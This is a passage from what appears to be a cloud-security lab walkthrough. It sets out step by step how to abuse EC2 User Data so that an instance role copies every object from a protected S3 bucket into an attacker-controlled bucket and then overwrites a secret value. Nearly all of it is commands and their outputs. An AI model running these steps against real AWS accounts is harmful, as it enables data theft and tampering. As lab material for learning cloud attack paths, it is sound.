ak=${AWS_ACCESS_KEY_ID}
sk=${AWS_SECRET_ACCESS_KEY}
st=${AWS_SESSION_TOKEN}
keys=$(aws s3api list-objects-v2 --bucket galactic-federation-level9-access-111122223333 --query 'Contents[*].Key' --output text)
for k in ${keys}; do
aws s3api get-object --bucket galactic-federation-level9-access-111122223333 --key ${k} ${k};
done
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
unset AWS_SESSION_TOKEN
for k in ${keys}; do
aws s3api put-object --bucket galactic-federation-jenkins-code-111122223333 --key secret/${k} --body ${k};
done
export AWS_ACCESS_KEY_ID=${ak}
export AWS_SECRET_ACCESS_KEY=${sk}
export AWS_SESSION_TOKEN=${st}
--//
Now it is time to start the EC2 instance with the new User Data attribute and check for results - aws ec2 start-instances --profile galactic --region us-west-2 --instance-ids i-1234567890abcdef0.

{
  "StartingInstances": [
      {
          "CurrentState": {
              "Code": 0,
              "Name": "pending"
          },
          "InstanceId": "i-1234567890abcdef0",
          "PreviousState": {
              "Code": 80,
              "Name": "stopped"
          }
      }
  ]
}
Keep checking until the EC2 instance is in "running" state: aws ec2 describe-instances --instance-ids i-1234567890abcdef0 --profile galactic --region us-west-2 | jq '.Reservations[].Instances[].State'.

{
"Code": 16,
"Name": "running"
}
Use this script to download the files gotten from the level9 S3 Bucket:

#!/bin/bash
mkdir secret
keys=$(aws s3api list-objects-v2 --bucket galactic-federation-jenkins-code-111122223333 --profile galactic | jq -r ''.Contents[].Key'')
for k in ${keys}; do
aws s3api get-object --bucket galactic-federation-jenkins-code-111122223333 --profile galactic --key ${k} ${k};
done
Replace the "1" in the file secret/currency_value for a "0". Check if it is correct cat secret/currency_value:

0
Upload to the notes S3 Bucket: aws s3api put-object --profile galactic --bucket galactic-federation-jenkins-code-111122223333 --key secret/currency_value --body secret/currency_value

{
  "ETag": "\"897316929176464ebc9ad085f31e7284\"",
  "ServerSideEncryption": "AES256"
}
Stop the EC2 instance aws ec2 stop-instances --profile galactic --region us-west-2 --instance-ids i-1234567890abcdef0.

{
  "StoppingInstances": [
      {
          "CurrentState": {
              "Code": 64,
              "Name": "stopping"
          },
          "InstanceId": "i-1234567890abcdef0",
          "PreviousState": {
              "Code": 16,
              "Name": "running"
          }
      }
  ]
}
Keep checking until the EC2 instance is in "stopped" state: aws ec2 describe-instances --instance-ids i-1234567890abcdef0 --profile galactic --region us-west-2 | jq '.Reservations[].Instances[].State'.

{
"Code": 80,
"Name": "stopped"
}
Reset User Data attribute - aws ec2 modify-instance-attribute --profile galactic --region us-west-2 --instance-id i-1234567890abcdef0 --user-data Value=. Does not return response for success. You can still check for errors:

echo $?
0
Describe the User Data attribute, should be empty aws ec2 describe-instance-attribute --attribute userData --instance-id i-1234567890abcdef0 --profile galactic --region us-west-2.

{
  "InstanceId": "i-1234567890abcdef0",
  "UserData": {}
}
Start the EC2 instance with an empty User Data attribute aws ec2 start-instances --profile galactic --region us-west-2 --instance-ids i-1234567890abcdef0.

{
  "StartingInstances": [
      {
          "CurrentState": {
              "Code": 0,
              "Name": "pending"
          },
          "InstanceId": "i-1234567890abcdef0",
          "PreviousState": {
              "Code": 80,
              "Name": "stopped"
          }
      }
  ]
}
Keep checking until the EC2 instance is in "running" state: aws ec2 describe-instances --instance-ids i-1234567890abcdef0 --profile galactic --region us-west-2 | jq '.Reservations[].Instances[].State'.

{
"Code": 16,
"Name": "running"
}
Stop the EC2 instance aws ec2 stop-instances --profile galactic --region us-west-2 --instance-ids i-1234567890abcdef0.

{
  "StoppingInstances": [
      {
          "CurrentState": {
              "Code": 64,
              "Name": "stopping"
          },
          "InstanceId": "i-1234567890abcdef0",
          "PreviousState": {
              "Code": 16,
              "Name": "running"
          }
      }
  ]
}
Keep checking until the EC2 instance is in "stopped" state: aws ec2 describe-instances --instance-ids i-1234567890abcdef0 --profile galactic --region us-west-2 | jq '.Reservations[].Instances[].State'.

{
"Code": 80,
"Name": "stopped"
}
This is the new code to be saved into the EC2 instance User Data attribute:

Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
yum install -y jq
ak=${AWS_ACCESS_KEY_ID}
sk=${AWS_SECRET_ACCESS_KEY}
st=${AWS_SESSION_TOKEN}
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
unset AWS_SESSION_TOKEN
aws s3api get-object --bucket galactic-federation-jenkins-code-111122223333 --key secret/currency_value currency_value
export AWS_ACCESS_KEY_ID=${ak}
export AWS_SECRET_ACCESS_KEY=${sk}
export AWS_SESSION_TOKEN=${st}
aws s3api put-object --bucket galactic-federation-level9-access-111122223333 --key currency_value --body currency_value
--//
Modify the EC2 instance User Data attribute, effectively uploading the base64 of your (or the example above) bash script to it - aws ec2 modify-instance-attribute --profile galactic --region us-west-2 --instance-id i-1234567890abcdef0 --attribute userData --value file://push_secrets.b64. There is no output on success. But you can check for errors:

echo $?
0
Check if the instance profile has been modified correctly - aws ec2 describe-instance-attribute --attribute userData --instance-id i-1234567890abcdef0 --profile galactic --region us-west-2 | jq -r '.UserData.Value' | base64 --decode. The output should be identical to the code above:

Now it is time to start the EC2 instance with the new User Data attribute and check for results - aws ec2 start-instances --profile galactic --region us-west-2 --instance-ids i-1234567890abcdef0.

{
  "StartingInstances": [
      {
          "CurrentState": {
              "Code": 0,
              "Name": "pending"
          },
          "InstanceId": "i-1234567890abcdef0",
          "PreviousState": {
              "Code": 80,
              "Name": "stopped"
          }
      }
  ]
}
Keep checking until the EC2 instance is in "running" state: aws ec2 describe-instances --instance-ids i-1234567890abcdef0 --profile galactic --region us-west-2 | jq '.Reservations[].Instances[].State'.

{
"Code": 16,
"Name": "running"
}
The Galactic Federation has been toppled! It should automatically get solved, otherwise hit the "Check My Progress" button.